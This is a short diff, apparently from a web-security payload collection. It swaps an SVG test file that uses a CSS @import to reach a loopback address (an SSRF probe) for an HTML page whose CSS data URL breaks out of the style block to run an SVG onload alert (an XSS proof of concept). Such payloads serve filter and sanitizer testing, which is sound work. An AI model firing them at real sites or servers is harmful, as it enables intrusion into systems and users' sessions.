@@ -1,7 +1,14 @@
-<svg xmlns="http://www.w3.org/2000/svg">
-  <style>
-    @import url(http://127.1/ssrf.txt);
-  </style>
-  <circle cx="50" cy="50" r="45" fill="green"
-          id="foo"/>
-</svg>
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+div  {
+    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
+    background-color: #cccccc;
+}
+</style>
+</head>
+  <body>
+    <div>lol</div>
+  </body>
+</html>
